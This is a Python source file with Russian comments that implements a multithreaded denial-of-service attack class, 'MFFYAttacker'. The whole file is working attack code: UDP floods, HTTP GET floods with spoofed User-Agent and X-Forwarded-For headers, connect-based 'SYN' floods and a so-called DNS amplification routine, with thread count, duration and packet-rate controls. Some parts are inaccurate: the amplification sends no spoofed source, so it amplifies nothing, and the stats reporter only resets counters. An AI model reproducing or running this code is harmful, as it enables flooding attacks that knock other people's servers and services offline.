import socket
import threading
import time
import random
import requests
from datetime import datetime

# ─── УЛУЧШЕННАЯ ЛОГИКА АТАК MFFY ─────────────────────────────────────────────

class MFFYAttacker:
    def __init__(self, log_callback=None):
        """ Инициализация атакующего модуля. Поддержка коллбэка для логов. """
        self.log_callback = log_callback or (lambda m: print(f"[MFFY-STRIKE] {m}"))
        self.is_active = False
        self.attack_threads = []
        self.pps = 0
        self.bw = 0  # Пропускная способность в МБ/с
        self.stats_lock = threading.Lock()
        self.duration = 0
        self.pps_limit = 0
        self.start_time = 0

    def log(self, msg):
        self.log_callback(msg)

    def start_attack(self, target, port, method, threads=100, duration=600, pps_limit=0):
        """ Запуск атаки на цель с заданными параметрами. """
        if self.is_active: return
        self.is_active = True
        self.duration = duration
        self.pps_limit = pps_limit
        self.start_time = time.time()
        
        self.log(f"[STRIKE] Инициализация {method} на {target}:{port}...")
        self.log(f"[STRIKE] Конфиг: {threads} потоков | Длительность: {duration}с | PPS: {'Без лимита' if pps_limit == 0 else pps_limit}")
        
        for i in range(threads):
            t = threading.Thread(target=self._attack_worker, args=(target, port, method, i), daemon=True)
            t.start()
            self.attack_threads.append(t)

        # Поток для отчета статистики
        threading.Thread(target=self._stats_reporter, daemon=True).start()
        
        # Поток для автоматического завершения атаки
        threading.Thread(target=self._auto_term, daemon=True).start()

    def stop_attack(self):
        """ Принудительная остановка атаки. """
        self.is_active = False
        self.log("[STRIKE] Команда на завершение отправлена. Остановка всех потоков.")
        self.attack_threads = []

    def _auto_term(self):
        """ Проверка времени выполнения и автоматическое отключение. """
        while self.is_active:
            if time.time() - self.start_time >= self.duration:
                self.log("[STRIKE] Окно насыщения цели завершено. Операция прекращена.")
                self.stop_attack()
                break
            time.sleep(1)

    def _attack_worker(self, target, port, method, thread_id):
        """ Рабочий поток для отправки пакетов/запросов. """
        local_rand = random.Random(time.time() + thread_id)
        
        # Примерный расчет задержки для ограничения PPS на поток
        pps_per_thread = self.pps_limit / len(self.attack_threads) if self.pps_limit > 0 else 0
        min_sleep = 1.0 / pps_per_thread if pps_per_thread > 0 else 0

        while self.is_active:
            t1 = time.time()
            try:
                if method == "UDP_FLOOD":
                    self._udp_flood(target, port, local_rand)
                elif method == "HTTP_GET":
                    self._http_get_flood(target, port, local_rand)
                elif method == "SYN_FLOOD":
                    self._syn_flood(target, port, local_rand)
                elif method == "DNS_AMP":
                    self._dns_amp_flood(target, port, local_rand)
                
                # Реализация ограничения PPS
                if min_sleep > 0:
                    elapsed = time.time() - t1
                    if elapsed < min_sleep:
                        time.sleep(min_sleep - elapsed)
            except:
                pass

    def _udp_flood(self, target, port, rnd):
        """ Отправка UDP-пакетов (L4). """
        payload = rnd.randbytes(1400)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload, (target, port))
            with self.stats_lock:
                self.pps += 1
                self.bw += 1400 / (1024 * 1024)

    def _http_get_flood(self, target, port, rnd):
        """ Отправка HTTP GET-запросов (L7). Рандомизация заголовков и IP. """
        url = f"http://{target}:{port}/?q={rnd.getrandbits(32)}"
        headers = {
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{rnd.randint(100, 120)}.0.0.0 Safari/537.36",
            "X-Forwarded-For": f"{rnd.randint(1,255)}.{rnd.randint(0,255)}.{rnd.randint(0,255)}.{rnd.randint(1,255)}",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        try:
            requests.get(url, headers=headers, timeout=1.0)
            with self.stats_lock:
                self.pps += 1
                self.bw += 512 / (1024 * 1024)
        except: pass

    def _syn_flood(self, target, port, rnd):
        """ SYN-флуд через попытки подключения (TCP соединение). """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        s.connect_ex((target, port))
        with self.stats_lock:
            self.pps += 1
            self.bw += 64 / (1024 * 1024)
        s.close()

    def _dns_amp_flood(self, target, port, rnd):
        """ DNS Amplification - отправка запроса, вызывающего большой ответ. """
        # Стандартный DNS пакет ietf.org ANY query
        dns_packet = bytes.fromhex("1234010000010000000000010469657466036f72670000ff00010000291000000080000000")
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(dns_packet, (target, port))
            with self.stats_lock:
                self.pps += 1
                self.bw += len(dns_packet) / (1024 * 1024)

    def _stats_reporter(self):
        """ Сброс накопленной статистики каждую секунду. """
        while self.is_active:
            time.sleep(1)
            with self.stats_lock:
                self.pps = 0
                self.bw = 0
